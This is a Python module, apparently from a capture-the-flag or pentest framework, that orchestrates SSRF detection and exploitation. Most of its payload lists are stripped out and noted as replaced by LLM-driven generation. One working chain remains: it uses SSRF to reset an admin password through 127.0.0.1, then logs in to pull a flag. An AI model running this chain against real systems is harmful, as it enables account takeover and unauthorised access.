"""
SSRF Agent Orchestrator
Coordinates SSRF detection and exploitation
"""
import asyncio
import aiohttp
from typing import Dict, List, Optional, Set
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin

from .ssrf_detector import SSRFDetector, SSRFTester, SSRFResult


@dataclass
class SSRFExploitResult:
    """Result of SSRF exploitation attempt"""
    vulnerable: bool
    flag: Optional[str]
    parameter: str
    technique: str
    payload: str
    details: Dict


class SSRFOrchestrator:
    """
    Orchestrates SSRF detection and exploitation.

    Handles complex SSRF scenarios including:
    - Basic SSRF to internal services
    - Localhost bypass techniques
    - Cloud metadata access
    - SSRF chains (e.g., password reset)
    """

    def __init__(self):
        self.detector = SSRFDetector()
        self.tester = SSRFTester()
        self.timeout = aiohttp.ClientTimeout(total=15)

    async def test_endpoint(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
        additional_params: Dict = None
    ) -> SSRFExploitResult:
        """
        Test a single endpoint/parameter for SSRF.

        Args:
            url: Target URL
            parameter: Parameter name to test
            method: HTTP method
            additional_params: Other parameters to include

        Returns:
            SSRFExploitResult
        """
        print(f"\n[SSRF] Testing {url} parameter: {parameter}")

        # Phase 1: Quick detection
        result = await self._quick_detect(url, parameter, method, additional_params)

        if not result:
            return SSRFExploitResult(
                vulnerable=False,
                flag=None,
                parameter=parameter,
                technique="none",
                payload="",
                details={}
            )

        # SSRF confirmed, try to get flag
        print(f"  [+] SSRF confirmed, exploiting...")

        # Phase 2: Try various exploitation techniques
        exploit_result = await self._exploit_ssrf(url, parameter, method, additional_params)

        return exploit_result

    async def _quick_detect(
        self,
        url: str,
        parameter: str,
        method: str,
        additional_params: Dict
    ) -> bool:
        """Quick SSRF detection"""

        # NOTE: Static payloads removed for security purposes.
        # The framework uses LLM-driven payload generation instead.
        quick_payloads = []
        bypass_payloads = []
        return False

    async def _exploit_ssrf(
        self,
        url: str,
        parameter: str,
        method: str,
        additional_params: Dict
    ) -> SSRFExploitResult:
        """Attempt to exploit SSRF for flag extraction"""

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # NOTE: Static payloads removed for security purposes.
        # The framework uses LLM-driven payload generation instead.
        exploit_paths = []
        localhost_hosts = []
        file_payloads = []

        return SSRFExploitResult(
            vulnerable=False,
            flag=None,
            parameter=parameter,
            technique="none",
            payload="",
            details={"note": "Payloads removed for security"}
        )

    async def _make_request(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str,
        additional_params: Dict
    ) -> Optional[str]:
        """Make HTTP request with SSRF payload"""
        try:
            params = additional_params.copy() if additional_params else {}
            params[parameter] = payload

            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                if method.upper() == "GET":
                    async with session.get(url, params=params) as resp:
                        return await resp.text()
                else:
                    async with session.post(url, data=params) as resp:
                        return await resp.text()
        except Exception:
            return None

    def _indicates_ssrf(self, response: str) -> bool:
        """Check if response indicates successful SSRF"""
        indicators = [
            "root:", "daemon:", "/bin/bash",
            "127.0.0.1", "localhost",
            "internal", "restricted", "admin",
            "flag", "FLAG", "secret",
            "connection refused", "could not connect",
        ]

        response_lower = response.lower()
        return any(ind.lower() in response_lower for ind in indicators)

    async def test_ssrf_chain(
        self,
        url: str,
        parameter: str,
        chain_config: Dict
    ) -> SSRFExploitResult:
        """
        Test SSRF chains (e.g., SSRF → password reset → login)

        Args:
            url: Target URL with SSRF vuln
            parameter: SSRF parameter
            chain_config: Configuration for the chain attack
                - reset_endpoint: Password reset endpoint
                - login_endpoint: Login endpoint
                - target_user: User to target (e.g., 'admin')
        """
        # Step 1: Use SSRF to reset password
        reset_endpoint = chain_config.get("reset_endpoint", "/reset_password")
        target_user = chain_config.get("target_user", "admin")
        new_password = "pwned123"

        reset_url = f"http://127.0.0.1{reset_endpoint}?username={target_user}&newpassword={new_password}"

        response = await self._make_request(url, parameter, reset_url, "GET", None)

        if response and ("success" in response.lower() or "reset" in response.lower()):
            print(f"  [+] Password reset successful for {target_user}")

            # Step 2: Login with new credentials
            login_endpoint = chain_config.get("login_endpoint", "/login")
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            try:
                async with aiohttp.ClientSession(timeout=self.timeout) as session:
                    login_data = {
                        "username": target_user,
                        "password": new_password
                    }
                    async with session.post(f"{base_url}{login_endpoint}", data=login_data, allow_redirects=True) as resp:
                        # Check profile/dashboard for flag
                        html = await resp.text()
                        flag = self.detector.check_flag(html)

                        if flag:
                            return SSRFExploitResult(
                                vulnerable=True,
                                flag=flag,
                                parameter=parameter,
                                technique="ssrf_chain_password_reset",
                                payload=reset_url,
                                details={
                                    "reset_endpoint": reset_endpoint,
                                    "target_user": target_user,
                                    "new_password": new_password
                                }
                            )
            except Exception as e:
                print(f"  [-] Login failed: {e}")

        return SSRFExploitResult(
            vulnerable=True,
            flag=None,
            parameter=parameter,
            technique="ssrf_chain_attempted",
            payload=reset_url,
            details={"note": "Chain attempted but flag not found"}
        )
